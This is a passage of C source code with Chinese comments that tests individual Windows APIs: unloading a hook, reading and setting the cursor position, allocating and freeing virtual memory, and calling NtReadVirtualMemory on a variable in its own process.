			if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
				break;
			}
		}

		// 卸载钩子
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
		printf("钩子已卸载，返回菜单。\n");
	}
}

void testGetCursorPos() {
	POINT pt;
	for (int i = 0; i < 10; i++) {
		if (GetCursorPos(&pt)) {
			printf("当前鼠标坐标: (%ld, %ld)\n", pt.x, pt.y);
		}
		else {
			printf("GetCursorPos 调用失败，错误码: %lu\n", GetLastError());
		}
		Sleep(500);
	}
}

void testSetCursorPos() {
	// 依次移动光标到屏幕的几个点，演示调用
	POINT pts[] = {
		{100, 100},
		{200, 200},
		{300, 300},
		{400, 400},
		{500, 500},
	};

	for (int i = 0; i < sizeof(pts) / sizeof(pts[0]); i++) {
		BOOL res = SetCursorPos(pts[i].x, pts[i].y);
		if (res) {
			printf("SetCursorPos 成功，坐标: (%d, %d)\n", pts[i].x, pts[i].y);
		}
		else {
			printf("SetCursorPos 失败，错误码: %lu\n", GetLastError());
		}
		Sleep(500);
	}
}


void testVirtualFree() {
	// 先申请一块虚拟内存
	SIZE_T size = 4096;
	LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (mem == NULL) {
		printf("VirtualAlloc 失败，错误码: %lu\n", GetLastError());
		return;
	}
	printf("成功分配内存: %p 大小: %zu\n", mem, size);

	// 填充数据演示
	memset(mem, 0xAB, size);

	// 释放内存，测试 VirtualFree
	BOOL res = VirtualFree(mem, 0, MEM_RELEASE);
	if (res) {
		printf("VirtualFree 释放成功\n");
	}
	else {
		printf("VirtualFree 失败，错误码: %lu\n", GetLastError());
	}
}

void testNtReadVirtualMemory() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) {
		printf("无法加载 ntdll.dll\n");
		return;
	}

	typedef NTSTATUS(WINAPI* pfnNtReadVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID BaseAddress,
		PVOID Buffer,
		SIZE_T BufferSize,
		PSIZE_T NumberOfBytesRead);

	pfnNtReadVirtualMemory NtReadVirtualMemory =
		(pfnNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

	if (!NtReadVirtualMemory) {
		printf("无法获取 NtReadVirtualMemory 地址\n");
		return;
	}

	int secret = 0xCAFEBABE;
	int buffer = 0;
	SIZE_T bytesRead = 0;

	NTSTATUS status = NtReadVirtualMemory(
		GetCurrentProcess(),
		&secret,       // 从本进程的 secret 变量中读取
		&buffer,       // 读取到本地变量 buffer
		sizeof(buffer),
		&bytesRead
	);

	if (status == 0) {
		printf("NtReadVirtualMemory 成功: 读取值=0x%X，字节数=%llu\n", buffer, bytesRead);
	}
	else {
		printf("NtReadVirtualMemory 失败: 状态码=0x%08X\n", status);
	}

	FreeLibrary(hNtdll);
}